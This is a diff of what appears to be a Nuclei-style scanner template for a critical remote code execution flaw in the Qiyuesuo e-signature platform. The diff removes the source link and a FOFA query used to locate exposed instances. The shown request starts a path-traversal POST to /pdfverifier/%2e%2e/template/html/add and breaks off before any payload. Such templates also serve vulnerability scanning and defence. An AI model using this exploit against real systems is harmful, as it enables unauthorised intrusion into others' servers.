@@ -3,12 +3,8 @@ info:
   name: 契约锁电子签章系统pdfverifier存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ly9so9hf5z0yrvp3'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ly9so9hf5z0yrvp3
-    fofa: app="契约锁-电子签署平台"
 http:
 - raw:
   - 'POST /pdfverifier/%2e%2e/template/html/add HTTP/1.1
